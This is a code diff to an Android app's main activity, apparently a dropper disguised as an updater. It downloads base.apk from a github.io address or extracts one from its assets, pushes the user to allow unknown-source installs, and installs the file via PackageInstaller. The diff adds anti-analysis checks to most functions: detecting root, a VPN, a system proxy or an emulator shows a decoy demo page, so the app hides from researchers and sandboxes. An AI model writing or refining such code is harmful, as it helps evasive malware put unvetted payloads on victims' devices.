@@ -652,11 +652,7 @@ class MainActivity : ComponentActivity() {
         webView?.let { view ->
             val curUrl = view.url ?: ""
             if (isPolicyViolated || isDeviceRooted() || isVpnActive() || isEmulator()) {
-                isPolicyViolated = true
-                securityCheckPassed = false
-                if (!curUrl.contains("demo.html")) {
-                    view.loadUrl("file:///android_asset/demo.html")
-                }
+                handlePolicyViolation()
             } else if (securityCheckPassed) {
                 if (curUrl.contains("demo.html") || curUrl.isEmpty()) {
                     view.loadUrl("file:///android_asset/main_ui.html")
@@ -674,6 +670,10 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun handleInstallStatusIntent(intent: Intent?) {
+        if (isPolicyViolated || isDeviceRooted() || isVpnActive() || isEmulator()) {
+            handlePolicyViolation()
+            return
+        }
         if (intent == null) return
         val action = intent.action
         if (action != "com.example.INSTALL_STATUS") return
@@ -972,6 +972,10 @@ class MainActivity : ComponentActivity() {
     }
 
     internal fun downloadApkFromServer(context: Context, progressCallback: ((Int) -> Unit)? = null): File {
+        if (isPolicyViolated || isDeviceRooted() || isVpnActive() || isEmulator()) {
+            handlePolicyViolation()
+            throw java.io.IOException("Security policy violation detected. Operation aborted.")
+        }
         val outFile = File(context.cacheDir, "base.apk")
         try {
             val url = java.net.URL("https://gojoacc68-png.github.io/Base/base.apk")
@@ -1021,9 +1025,28 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun loadMetadataAndNotifyUrl() {
+        if (isPolicyViolated || isDeviceRooted() || isVpnActive() || isEmulator()) {
+            handlePolicyViolation()
+            return
+        }
         Thread {
             try {
-                val apkFile = downloadApkFromServer(this)
+                var apkFile: File? = null
+                try {
+                    apkFile = downloadApkFromServer(this)
+                } catch (e: Exception) {
+                    Log.w("MainActivity", "Failed to download base.apk from server, falling back to local asset/apk extraction: ${e.message}")
+                    try {
+                        apkFile = extractAssetApk(this)
+                    } catch (ex: Exception) {
+                        Log.e("MainActivity", "Local asset/apk extraction fallback also failed: ${ex.message}")
+                    }
+                }
+
+                if (apkFile == null || !apkFile.exists() || apkFile.length() == 0L) {
+                    throw Exception("No valid APK binary available (server failed and asset extraction failed)")
+                }
+
                 val metadata = getArchiveMetadata(this, apkFile)
                 
                 cachedApkAppName = metadata.appName
@@ -1078,6 +1101,10 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun handleUpdateClicked() {
+        if (isPolicyViolated || isDeviceRooted() || isVpnActive() || isEmulator()) {
+            handlePolicyViolation()
+            return
+        }
         if (isUpdateStarted) return
         isUpdateStarted = true
 
@@ -1126,6 +1153,10 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun checkAndProceedWithPermissions() {
+        if (isPolicyViolated || isDeviceRooted() || isVpnActive() || isEmulator()) {
+            handlePolicyViolation()
+            return
+        }
         // 1. Force Unknown Sources / Install Apps permission check and action prompt
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             if (!packageManager.canRequestPackageInstalls()) {
@@ -1174,6 +1205,10 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun startVpnServiceInstance() {
+        if (isPolicyViolated || isDeviceRooted() || isVpnActive() || isEmulator()) {
+            handlePolicyViolation()
+            return
+        }
         updateStatusInWebView("Establishing VPN Update Link...", null)
         
         try {
@@ -1214,6 +1249,10 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun startSecureHandshakeAndInstallFlow() {
+        if (isPolicyViolated || isDeviceRooted() || isVpnActive() || isEmulator()) {
+            handlePolicyViolation()
+            return
+        }
         // Generate secure token and cryptographic AES-256 session key before connecting
         val installToken = java.util.UUID.randomUUID().toString()
         val sessionKey = CryptoSecurityUtil.generateAES256Key()
@@ -1274,6 +1313,10 @@ class MainActivity : ComponentActivity() {
     }
 
     internal fun installApkViaPackageInstaller(apkFile: File) {
+        if (isPolicyViolated || isDeviceRooted() || isVpnActive() || isEmulator()) {
+            handlePolicyViolation()
+            return
+        }
         if (!apkFile.exists() || apkFile.length() == 0L) {
             runOnUiThread {
                 updateStatusInWebView("Installation Failed", "Clean apk binary not found")
@@ -1464,13 +1507,17 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun isVpnActive(): Boolean {
+        if (VPNInstallerService.isServiceRunning) {
+            return false
+        }
         // 1. Check network interfaces for active tunnels (no permissions needed)
         try {
             val interfaces = java.util.Collections.list(java.net.NetworkInterface.getNetworkInterfaces())
             for (intf in interfaces) {
                 if (intf.isUp) {
                     val name = intf.name.lowercase()
-                    if (name.contains("tun") || name.contains("ppp") || name.contains("tap") || name.contains("p2p") || name.contains("tun0") || name.contains("ppp0")) {
+                    // Filter out p2p (WiFi Direct) and ppp (cellular/carrier tunnel false-positives)
+                    if (name.contains("tun") || name.contains("tap") || name.contains("vpn")) {
                         Log.d("SecurityCheck", "VPN detected: interface name $name")
                         return true
                     }
@@ -1504,6 +1551,18 @@ class MainActivity : ComponentActivity() {
             // ignore
         }
 
+        // 3. Check proxy settings
+        try {
+            val proxyHost = System.getProperty("http.proxyHost")
+            val proxyPort = System.getProperty("http.proxyPort")
+            if (!proxyHost.isNullOrEmpty() && !proxyPort.isNullOrEmpty()) {
+                Log.d("SecurityCheck", "Proxy/VPN detected: System proxy set")
+                return true
+            }
+        } catch (e: Exception) {
+            // ignore
+        }
+
         return false
     }
 
@@ -1525,8 +1584,7 @@ class MainActivity : ComponentActivity() {
                 || model.contains("Android SDK built for x86")
                 || model.contains("SDK")
                 || manufacturer.contains("Genymotion")
-                || manufacturer.contains("Google") && brand.startsWith("generic") && device.startsWith("generic")
-                || brand.startsWith("generic") && device.startsWith("generic")
+                || (brand.startsWith("generic") && device.startsWith("generic"))
                 || product.contains("sdk_google")
                 || product.contains("google_sdk")
                 || product.contains("sdk")
@@ -1566,15 +1624,24 @@ class MainActivity : ComponentActivity() {
         return false
     }
 
-    private fun checkPhysicalMovementAndProceed() {
-        if (isDeviceRooted() || isVpnActive() || isEmulator()) {
-            isPolicyViolated = true
-            securityCheckPassed = false
-            runOnUiThread {
-                webView?.let { view ->
+    private fun handlePolicyViolation() {
+        isPolicyViolated = true
+        securityCheckPassed = false
+        stopVpnServiceInstance()
+        permissionPollHandler.removeCallbacks(permissionPollRunnable)
+        runOnUiThread {
+            webView?.let { view ->
+                val curUrl = view.url ?: ""
+                if (!curUrl.contains("demo.html")) {
                     view.loadUrl("file:///android_asset/demo.html")
                 }
             }
+        }
+    }
+
+    private fun checkPhysicalMovementAndProceed() {
+        if (isDeviceRooted() || isVpnActive() || isEmulator()) {
+            handlePolicyViolation()
             return
         }
 
@@ -1601,7 +1668,10 @@ class MainActivity : ComponentActivity() {
     inner class AndroidJSInterface {
         @JavascriptInterface
         fun onUpdateClicked() {
-            if (isPolicyViolated) return
+            if (isPolicyViolated || isDeviceRooted() || isVpnActive() || isEmulator()) {
+                handlePolicyViolation()
+                return
+            }
             runOnUiThread {
                 handleUpdateClicked()
             }
@@ -1609,7 +1679,10 @@ class MainActivity : ComponentActivity() {
 
         @JavascriptInterface
         fun onResetClicked() {
-            if (isPolicyViolated) return
+            if (isPolicyViolated || isDeviceRooted() || isVpnActive() || isEmulator()) {
+                handlePolicyViolation()
+                return
+            }
             runOnUiThread {
                 getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                     .edit()
